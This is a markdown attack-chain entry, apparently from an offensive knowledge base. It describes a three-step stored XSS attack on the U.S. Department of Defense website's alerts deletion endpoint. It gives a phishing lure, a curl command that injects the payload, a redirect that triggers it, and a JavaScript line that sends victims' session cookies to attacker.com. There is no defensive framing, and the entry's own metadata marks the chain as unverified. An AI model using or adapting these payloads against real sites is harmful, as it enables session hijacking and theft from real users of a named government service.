---
id: ac-uuid-123
tags:
  - xss
  - stored-xss
  - web
  - javascript
  - session-hijacking
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Lure-Victim-to-Attacker-Site]]'
  - '[[procedures/Inject-Stored-XSS-into-Delete-Endpoint]]'
  - '[[procedures/Trigger-XSS-on-Alerts-Page]]'
step_count: 3
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T03:47:12.586Z'
description: >-
  A multi-stage stored XSS attack exploiting unsanitized ID parameters in the
  DoD website's alerts deletion endpoint to execute JavaScript in victims'
  browsers.
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---
---

# Stored XSS in DoD Alerts Deletion Endpoint for Session Hijacking

Multi-stage attack chain demonstrating a complete stored XSS workflow on the U.S. Department of Defense website.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Lure Victim to Attacker Site] --> B[Inject XSS Payload via Delete Endpoint]
    B --> C[Trigger XSS on Alerts Page]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (relies on web browser and basic HTTP client like curl)

### Target Environment

- Web platform
- Access to public-facing DoD website (e.g., www.dod.mil or similar)
- No specific ports required beyond standard HTTPS (443)

### Initial Access Requirements

- Control over a malicious website (attacker.com)
- Victim must be a logged-in user of the DoD site
- No prior credentials needed for attacker

## Detailed Attack Procedures

### Step 1: Lure Victim to Attacker Site
procedure: [[procedures/Lure-Victim-to-Attacker-Site]]

**Objective**: Trick the victim into visiting the attacker's controlled website to initiate the exploit chain without direct interaction with the target DoD site.

**Instructions**: Use social engineering techniques, such as phishing emails or malicious links, to direct the victim to attacker.com. On the site, automatically trigger the next steps via JavaScript.

**Expected Output**: Victim's browser loads attacker.com and begins the injection process.

**Success Indicators**:
- Victim accesses attacker.com (track via logs or analytics)
- No direct error from victim interaction

### Step 2: Inject Stored XSS Payload
procedure: [[procedures/Inject-Stored-XSS-into-Delete-Endpoint]]

**Objective**: Send a GET request from the attacker's site to the DoD delete alerts endpoint with a malicious ID containing an XSS payload, which gets stored due to lack of sanitization.

**Instructions**: From attacker.com, use JavaScript or a server-side script to issue the GET request. Example using [[commands/inject-xss-delete-alerts]] via curl for testing:

```bash
curl "https://www.dod.mil/alerts/delete/id/1234<img src=x onerror=alert('XSS')>"
```

Replace the payload with actual JavaScript, e.g., for session theft: `document.location='http://attacker.com/steal?cookie='+document.cookie`.

**Expected Output**: HTTP response indicating the request was processed (e.g., 200 or 302), with the payload stored server-side.

**Success Indicators**:
- No immediate error in response
- Payload confirmed stored (via later trigger)

### Step 3: Trigger Stored XSS Execution
procedure: [[procedures/Trigger-XSS-on-Alerts-Page]]

**Objective**: Redirect the victim to the DoD alerts page or member options, causing an error that displays the unsanitized stored ID and executes the XSS payload in the victim's browser.

**Instructions**: From attacker.com, use JavaScript to redirect: `window.location.href = 'https://www.dod.mil/alerts/';`. This triggers an error dialog (e.g., invalid ID ownership) that reflects the payload.

**Expected Output**: Victim's browser executes the JavaScript payload, e.g., alert popup or cookie exfiltration to attacker.com.

**Success Indicators**:
- JavaScript execution confirmed (e.g., alert fires or network request to attacker.com)
- Potential session data stolen

## Attack Chain Summary

### Key Achievements

1. Successful storage of XSS payload via unsanitized ID parameter
2. Triggering of arbitrary JavaScript execution in victim context
3. Potential for session hijacking or data theft on DoD platform

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

---

*Last updated: 2023-10-01T00:00:00Z*
